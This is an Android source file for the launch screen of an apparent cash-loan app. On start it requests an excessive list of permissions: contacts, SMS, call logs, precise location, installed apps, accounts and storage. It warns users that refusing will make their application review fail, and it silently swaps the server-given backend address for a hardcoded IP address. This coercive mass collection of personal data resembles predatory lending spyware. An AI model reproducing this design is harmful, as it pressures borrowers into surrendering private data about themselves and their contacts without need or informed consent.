package com.idss.cashloans.ui.activity;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.azhon.basic.base.BaseActivity;
import com.idss.cashloans.api.Constants;
import com.idss.cashloans.api.utils.LogUtil;
import com.idss.cashloans.databinding.ActivitySplashBinding;
import com.idss.cashloans.ui.ViewMoudle.SplashActivityVM;
import com.idss.cashloans.ui.activity.main.MainActivity;

import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.core.Observer;
import io.reactivex.rxjava3.disposables.Disposable;

public class SplashActivity extends BaseActivity<SplashActivityVM, ActivitySplashBinding> {
    private static final String[] PERMISSIONS_STORAGE = {
            "android.permission.CAMERA",
            "android.permission.WRITE_SETTINGS",
            "android.permission.READ_CONTACTS",
            "android.permission.WRITE_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.QUERY_ALL_PACKAGES",
            "com.android.permission.GET_INSTALLED_APPS",
            "android.permission.READ_PHONE_STATE",
            "android.permission.GET_INSTALLED_APPS",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_PRIVILEGED_PHONE_STATE",
            "android.permission.MOUNT_UNMOUNT_FILESYSTEMS",
            "android.permission.GET_ACCOUNTS"};
    private static final int REQUEST_CODE = 1;

    @Override
    protected void onCreate(View view, Bundle savedInstanceState) {
        getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
        View stateView = getWindow().getDecorView();
        int vis = stateView.getSystemUiVisibility();
        vis |= View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR; //黑色
//        vis &= ~View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR; //白色
        stateView.setSystemUiVisibility(vis);//设置状态栏字体颜色
        getWindow().setStatusBarColor(getColor(com.azhon.basic.R.color.white));
    }

    @Override
    protected void initView() {
        //申请权限
        ActivityCompat.requestPermissions(SplashActivity.this, PERMISSIONS_STORAGE, REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String permissions[], @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            //权限的申请结果返回
            case REQUEST_CODE:
                LogUtil.e("同意的权限数量：" + (grantResults.length));
                LogUtil.e("第一个权限是不是被同意：" + (PackageManager.PERMISSION_GRANTED));
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Observable.just("Hello").delay(0, TimeUnit.SECONDS).subscribe(new Observer<String>() {
                        @Override
                        public void onSubscribe(Disposable d) {
                            System.out.println("onSubscribe");
                        }

                        @Override
                        public void onNext(String s) {
                            System.out.println("onNext");
                        }

                        @Override
                        public void onError(Throwable e) {
                            System.out.println("onError: " + e.getMessage());
                        }

                        @Override
                        public void onComplete() {
                            viewModel.getOfficialUrl(SplashActivity.this);
                        }
                    });
                } else {
                    //未授权
                    Toast.makeText(this, "申请权限被拒绝,这将导致审核失败.", Toast.LENGTH_SHORT).show();
                }

                break;
        }
    }


    @Override
    protected void initData() {
        viewModel.getOfficialUrlMutableLiveData().observe(this, officialUrl -> {
            LogUtil.e("officialUrl:" + officialUrl.getUrl());
            Constants.BASE_URL = officialUrl.getUrl();
            LogUtil.e("Constants.BASE_URL:" + Constants.BASE_URL);
            Constants.BASE_URL="http://46.149.202.219:8083/";
            startActivity(new Intent(SplashActivity.this, MainActivity.class));
            finish();
        });
    }
}